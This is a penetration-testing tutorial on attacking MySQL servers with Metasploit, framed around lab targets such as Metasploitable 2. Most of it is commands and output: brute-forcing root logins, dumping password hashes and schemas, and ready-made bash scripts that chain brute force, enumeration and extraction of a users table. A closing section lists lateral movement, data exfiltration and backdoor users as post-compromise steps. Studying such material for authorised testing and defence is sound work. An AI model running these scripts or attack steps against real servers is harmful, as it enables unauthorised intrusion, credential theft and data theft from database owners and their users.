# MySQL Enumeration with Metasploit

## Overview

MySQL is an open-source relational database management system (RDBMS) that uses Structured Query Language (SQL). This guide covers comprehensive MySQL enumeration techniques using Metasploit auxiliary modules to identify service versions, perform brute force attacks, enumerate database information, and execute SQL queries.

## MySQL Fundamentals

- **Port**: 3306/TCP (default, configurable)
- **Purpose**: Data storage for web applications, enterprise systems
- **Common Use Cases**: WordPress, Drupal, custom web applications
- **Authentication**: Username/password with privilege-based access
- **Default Users**: root (administrative), various application-specific users

## Lab Environment Setup

For practical exercises, use the **Metasploitable 2** or **TryHackMe** vulnerable machines:

**Lab Recommendations**:

- Metasploitable 2: [TryHackMe Room](https://tryhackme.com/room/metasploitable2)
- TryHackMe: [Internal](https://tryhackme.com/room/internal) or other MySQL-enabled machines

**Setup Requirements**:

- Target machine with MySQL service running
- Network connectivity to target
- Metasploit Framework installed

## Initial Setup and Configuration

### Starting Metasploit and Workspace

```bash
# Start database and Metasploit
sudo systemctl start postgresql
msfconsole

# Create dedicated workspace
msf6 > workspace -a mysql_enum
msf6 > workspace mysql_enum

# Set global RHOSTS variable
msf6 > setg RHOSTS 192.168.1.100
msf6 > setg RHOST 192.168.1.100
```

### Dynamic Target Configuration Script

```bash
#!/bin/bash

TARGET=$1
WORKSPACE="mysql_scan_$(date +%Y%m%d_%H%M%S)"

echo "[*] Starting MySQL enumeration"
echo "[*] Target: $TARGET"
echo "[*] Workspace: $WORKSPACE"

msfconsole -q -x "
workspace -a $WORKSPACE;
setg RHOSTS $TARGET;
setg RHOST $TARGET;
echo '[+] Global RHOSTS set to $TARGET';
exit"
```

**Usage**:

```bash
chmod +x mysql_setup.sh
./mysql_setup.sh 192.168.1.100
```

## Service Discovery and Version Detection

### Port Scanning for MySQL

```bash
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 3306
msf6 auxiliary(scanner/portscan/tcp) > run

[*] 192.168.1.100:3306 - TCP OPEN
[*] Scanned 1 of 1 hosts (100% complete)
```

### MySQL Version Detection

```bash
msf6 > search type:auxiliary name:mysql

msf6 > use auxiliary/scanner/mysql/mysql_version
msf6 auxiliary(scanner/mysql/mysql_version) > show options

Module options (auxiliary/scanner/mysql/mysql_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    3306             yes       The target port (TCP)
   THREADS  1                yes       The number of concurrent threads

msf6 auxiliary(scanner/mysql/mysql_version) > run

[*] 192.168.1.100:3306 - MySQL Server 5.5.61-0ubuntu0.14.04.1 - Ubuntu 14.04
[*] Scanned 1 of 1 hosts (100% complete)
```

### Comprehensive Version Detection Script

```bash
#!/bin/bash

TARGET=$1

msfconsole -q -x "
workspace -a mysql_version_check;
setg RHOSTS $TARGET;
use auxiliary/scanner/mysql/mysql_version;
run;
exit"
```

## MySQL Brute Force Attacks

### MySQL Login Scanner

```bash
msf6 > use auxiliary/scanner/mysql/mysql_login
msf6 auxiliary(scanner/mysql/mysql_login) > show options

Module options (auxiliary/scanner/mysql/mysql_login):

   Name              Current Setting                      Required  Description
   ----              ---------------                      --------  -----------
   BLANK_PASSWORDS   false                                no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                    yes       How fast to bruteforce, from 0 to 5
   PASSWORD                                              no        A specific password to authenticate with
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  no        File containing passwords, one per line
   RHOSTS                                               yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT             3306                                yes       The target port (TCP)
   STOP_ON_SUCCESS   false                                yes       Stop guessing when a credential works for a host
   THREADS           1                                   yes       The number of concurrent threads per host
   USERNAME                                           no        A specific username to authenticate as
   USERPASS_FILE                                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/common_users.txt  no        File containing usernames, one per line
   VERBOSE           true                                 yes       Whether to print output for all attempts
```

### Targeted Root User Brute Force

```bash
# Target root user specifically
msf6 auxiliary(scanner/mysql/mysql_login) > set USERNAME root
msf6 auxiliary(scanner/mysql/mysql_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf6 auxiliary(scanner/mysql/mysql_login) > set STOP_ON_SUCCESS true
msf6 auxiliary(scanner/mysql/mysql_login) > set VERBOSE false
msf6 auxiliary(scanner/mysql/mysql_login) > run

[+] 192.168.1.100:3306 - Success: 'root:twinkle'
[*] Scanned 1 of 1 hosts (100% complete)
```

### Multi-User Brute Force

```bash
# Brute force multiple users
msf6 auxiliary(scanner/mysql/mysql_login) > unset USERNAME
msf6 auxiliary(scanner/mysql/mysql_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf6 auxiliary(scanner/mysql/mysql_login) > set USER_AS_PASS true
msf6 auxiliary(scanner/mysql/mysql_login) > set BLANK_PASSWORDS true
msf6 auxiliary(scanner/mysql/mysql_login) > run
```

### Advanced Brute Force Script

```bash
#!/bin/bash

TARGET=$1
USER_LIST=${2:-"root"}  # Default to root user
PASS_LIST=${3:-"/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt"}

echo "[*] Starting MySQL brute force attack"
echo "[*] Target: $TARGET"
echo "[*] User: $USER_LIST"
echo "[*] Password list: $PASS_LIST"

msfconsole -q -x "
workspace -a mysql_brute_force;
setg RHOSTS $TARGET;
use auxiliary/scanner/mysql/mysql_login;
set USERNAME $USER_LIST;
set PASS_FILE $PASS_LIST;
set STOP_ON_SUCCESS true;
set THREADS 5;
set VERBOSE false;
run;
credentials;
exit"
```

## Database Enumeration with Credentials

### MySQL Enumeration Module

```bash
msf6 > use auxiliary/admin/mysql/mysql_enum
msf6 auxiliary(admin/mysql/mysql_enum) > show options

Module options (auxiliary/admin/mysql/mysql_enum):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   yes       The password for the specified username
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     3306             yes       The target port (TCP)
   USERNAME                   yes       The username to authenticate as

msf6 auxiliary(admin/mysql/mysql_enum) > set USERNAME root
msf6 auxiliary(admin/mysql/mysql_enum) > set PASSWORD twinkle
msf6 auxiliary(admin/mysql/mysql_enum) > run

[*] Running MySQL Enumerator...
[*] Version: 5.5.61-0ubuntu0.14.04.1
[*] Compiled for the following machine: debian-linux-gnu
[*] Architecture: x86_64
[*] Server Hostname: victim1
[*] Data Directory: /var/lib/mysql/
[*] Writing to my.cnf: /etc/mysql/my.cnf
[*] Account Information:
[*]  root - *9B9A6D3C7A25A38F5081F643F8DF16D6E20E1B5B (localhost)
[*]  root - *9B9A6D3C7A25A38F5081F643F8DF16D6E20E1B5B (victim1)
[*]  sysadmin - *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 (localhost)
[*] Privilege Information:
[*]  root has GRANT Privilege
[*]  root has RELOAD Privilege
[*]  root has SHUTDOWN Privilege
```

### MySQL Schema Dump

```bash
msf6 > use auxiliary/admin/mysql/mysql_schemadump
msf6 auxiliary(admin/mysql/mysql_schemadump) > show options

Module options (auxiliary/admin/mysql/mysql_schemadump):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   DISPLAY_RESULT  true             yes       Display the query results
   PASSWORD                         yes       The password for the specified username
   RHOSTS                           yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT           3306             yes       The target port (TCP)
   USERNAME                         yes       The username to authenticate as

msf6 auxiliary(admin/mysql/mysql_schemadump) > set USERNAME root
msf6 auxiliary(admin/mysql/mysql_schemadump) > set PASSWORD twinkle
msf6 auxiliary(admin/mysql/mysql_schemadump) > run

[*] Schema stored in: /root/.msf4/loot/20231201120000_default_192.168.1.100_mysql_schema_123456.txt
```

## SQL Query Execution

### MySQL SQL Module

```bash
msf6 > use auxiliary/admin/mysql/mysql_sql
msf6 auxiliary(admin/mysql/mysql_sql) > show options

Module options (auxiliary/admin/mysql/mysql_sql):

   Name      Current Setting        Required  Description
   ----      ---------------        --------  -----------
   PASSWORD                         yes       The password for the specified username
   RHOSTS                           yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     3306                   yes       The target port (TCP)
   SQL       select version()       no        The SQL query to execute
   USERNAME                         yes       The username to authenticate as

msf6 auxiliary(admin/mysql/mysql_sql) > set USERNAME root
msf6 auxiliary(admin/mysql/mysql_sql) > set PASSWORD twinkle
```

### Common SQL Queries for Enumeration

```bash
# Show databases
msf6 auxiliary(admin/mysql/mysql_sql) > set SQL "show databases;"
msf6 auxiliary(admin/mysql/mysql_sql) > run

[*] Sending statement: 'show databases;'...
[*]  | information_schema |
[*]  | mysql |
[*]  | upload |
[*]  | vendors |
[*]  | videos |
[*]  | warehouse |

# Show tables from specific database
msf6 auxiliary(admin/mysql/mysql_sql) > set SQL "use videos; show tables;"
msf6 auxiliary(admin/mysql/mysql_sql) > run

# Get user information
msf6 auxiliary(admin/mysql/mysql_sql) > set SQL "select user, host, password from mysql.user;"
msf6 auxiliary(admin/mysql/mysql_sql) > run

# Get database privileges
msf6 auxiliary(admin/mysql/mysql_sql) > set SQL "select * from mysql.db;"
msf6 auxiliary(admin/mysql/mysql_sql) > run
```

### Automated Database Exploration Script

```bash
#!/bin/bash

TARGET=$1
USER=$2
PASS=$3

echo "[*] Exploring MySQL database on $TARGET"

msfconsole -q -x "
workspace -a mysql_exploration;
setg RHOSTS $TARGET;
setg USERNAME $USER;
setg PASSWORD $PASS;

echo '[+] Listing databases';
use auxiliary/admin/mysql/mysql_sql;
set SQL 'show databases;';
run;

echo '[+] Checking user privileges';
set SQL 'select user, host, authentication_string from mysql.user;';
run;

echo '[+] Checking database permissions';
set SQL 'select * from mysql.db;';
run;

echo '[+] MySQL exploration complete';
exit"
```

## Complete MySQL Enumeration Workflow

### Comprehensive Assessment Script

```bash
#!/bin/bash

TARGET=$1
OUTPUT_DIR="mysql_full_enum_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT_DIR

echo "[*] Starting comprehensive MySQL enumeration"
echo "[*] Target: $TARGET"
echo "[*] Output directory: $OUTPUT_DIR"

msfconsole -q -x "
workspace -a full_mysql_scan;
setg RHOSTS $TARGET;

echo '[+] Detecting MySQL version';
use auxiliary/scanner/mysql/mysql_version;
run;

echo '[+] Performing brute force attack';
use auxiliary/scanner/mysql/mysql_login;
set USERNAME root;
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt;
set STOP_ON_SUCCESS true;
set VERBOSE false;
run;

# Store credentials for later use
creds;

echo '[+] Enumerating MySQL information';
use auxiliary/admin/mysql/mysql_enum;
set USERNAME root;
set PASSWORD twinkle;
run;

echo '[+] Dumping database schema';
use auxiliary/admin/mysql/mysql_schemadump;
set USERNAME root;
set PASSWORD twinkle;
run;

echo '[+] Executing information gathering queries';
use auxiliary/admin/mysql/mysql_sql;
set USERNAME root;
set PASSWORD twinkle;
set SQL 'show databases;';
run;
set SQL 'select user, host from mysql.user;';
run;

echo '[+] MySQL enumeration complete';
loot;
creds;
exit" > $OUTPUT_DIR/full_report.txt

echo "[+] Comprehensive report saved to $OUTPUT_DIR/full_report.txt"
```

**Usage**:

```bash
chmod +x mysql_complete_enum.sh
./mysql_complete_enum.sh 192.168.1.100
```

## Manual MySQL Interaction

### Command-Line MySQL Client

```bash
# Connect to MySQL server
mysql -h 192.168.1.100 -u root -p

# Enter password when prompted: twinkle

# Basic enumeration commands
mysql> show databases;
mysql> use information_schema;
mysql> show tables;
mysql> select * from SCHEMATA;
mysql> quit
```

### Common Manual Enumeration Queries

```sql
-- Show all databases
SHOW DATABASES;

-- Show current user and privileges
SELECT user(), current_user();
SHOW GRANTS;

-- List all users and hosts
SELECT user, host FROM mysql.user;

-- Show table information
SELECT table_schema, table_name FROM information_schema.tables;

-- Show column information
SELECT table_schema, table_name, column_name FROM information_schema.columns;

-- Show database privileges
SELECT * FROM mysql.db;
```

## Advanced MySQL Modules

### Hash Dumping

```bash
msf6 > use auxiliary/scanner/mysql/mysql_hashdump
msf6 auxiliary(scanner/mysql/mysql_hashdump) > set USERNAME root
msf6 auxiliary(scanner/mysql/mysql_hashdump) > set PASSWORD twinkle
msf6 auxiliary(scanner/mysql/mysql_hashdump) > run
```

### File Operations (if privileges allow)

```bash
msf6 > use auxiliary/admin/mysql/mysql_file_enum
msf6 auxiliary(admin/mysql/mysql_file_enum) > set USERNAME root
msf6 auxiliary(admin/mysql/mysql_file_enum) > set PASSWORD twinkle
msf6 auxiliary(admin/mysql/mysql_file_enum) > run
```

## Data Extraction and Analysis

### Extracting Sensitive Data

```bash
#!/bin/bash

TARGET=$1
USER=$2
PASS=$3
DATABASE=$4

echo "[*] Extracting data from $DATABASE on $TARGET"

msfconsole -q -x "
workspace -a data_extraction;
setg RHOSTS $TARGET;
use auxiliary/admin/mysql/mysql_sql;
set USERNAME $USER;
set PASSWORD $PASS;

# Extract table names
set SQL 'use $DATABASE; show tables;';
run;

# Extract data from each table (example)
set SQL 'use $DATABASE; select * from users;';
run;

exit"
```

## Best Practices and Security Considerations

### Optimization Tips

```bash
# For stealth operations
msf6 auxiliary(scanner/mysql/mysql_login) > set BRUTEFORCE_SPEED 3
msf6 auxiliary(scanner/mysql/mysql_login) > set THREADS 2

# For comprehensive testing
msf6 auxiliary(scanner/mysql/mysql_login) > set BLANK_PASSWORDS true
msf6 auxiliary(scanner/mysql/mysql_login) > set USER_AS_PASS true
```

### Common MySQL Security Issues

1. **Weak root passwords** (default or easily guessable)
2. **Network-accessible MySQL** without proper firewall rules
3. **Excessive privileges** for application users
4. **Outdated MySQL versions** with known vulnerabilities
5. **Default configurations** with unnecessary features enabled

### Defensive Recommendations

- Use strong, unique passwords for MySQL accounts
- Restrict network access to MySQL (bind-address = 127.0.0.1)
- Implement principle of least privilege for database users
- Regularly update MySQL software
- Monitor MySQL logs for suspicious activity
- Use MySQL enterprise security features if available

## Post-Compromise Actions

### After Gaining MySQL Access

1. **Document Findings**: Save credentials, database structures, and sensitive data
2. **Privilege Escalation**: Check for ways to elevate privileges within MySQL
3. **Lateral Movement**: Use discovered credentials for other services
4. **Data Exfiltration**: Extract sensitive information from databases
5. **Persistence**: Create backdoor users or scheduled tasks if possible

### Privilege Escalation Checks

```sql
-- Check for FILE privilege (allows reading files)
SELECT file_priv FROM mysql.user WHERE user = 'root';

-- Check for SUPER privilege
SELECT super_priv FROM mysql.user WHERE user = 'root';

-- Check for ability to write files
SELECT @@secure_file_priv;
```

## Next Steps

After successful MySQL enumeration:

1. Use discovered credentials for other services (password reuse)
2. Extract and analyze sensitive data from databases
3. Check for web application configuration files with database credentials
4. Look for opportunities for SQL injection in web applications
5. Move to PostgreSQL or other database enumeration if present

This MySQL enumeration methodology provides a thorough approach to assessing database services, from initial discovery to credential compromise and data extraction, enabling comprehensive penetration testing of database infrastructure.
